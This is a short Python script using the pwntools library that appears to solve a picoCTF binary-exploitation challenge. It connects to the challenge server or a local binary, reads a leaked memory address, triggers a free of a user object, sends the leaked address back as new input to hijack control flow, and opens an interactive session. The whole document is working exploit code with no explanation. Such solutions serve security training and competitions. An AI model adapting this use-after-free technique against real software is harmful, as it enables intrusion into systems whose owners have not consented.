#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'i386'

if len(sys.argv) > 1:
    r = remote('mercury.picoctf.net', 4593)
else:
    r = process('./vuln')

r.sendline('S')
r.recvuntil('OOP! Memory leak...')
haha = int(r.recvline()[:-1], 16)

info(f"""
haha = {hex(haha)}
""")

r.sendlineafter('(e)xit', 'I')
r.sendlineafter('(Y/N)?', 'Y')

r.sendlineafter('(e)xit', 'L')
r.sendafter('try anyways:', p32(haha))

r.interactive()
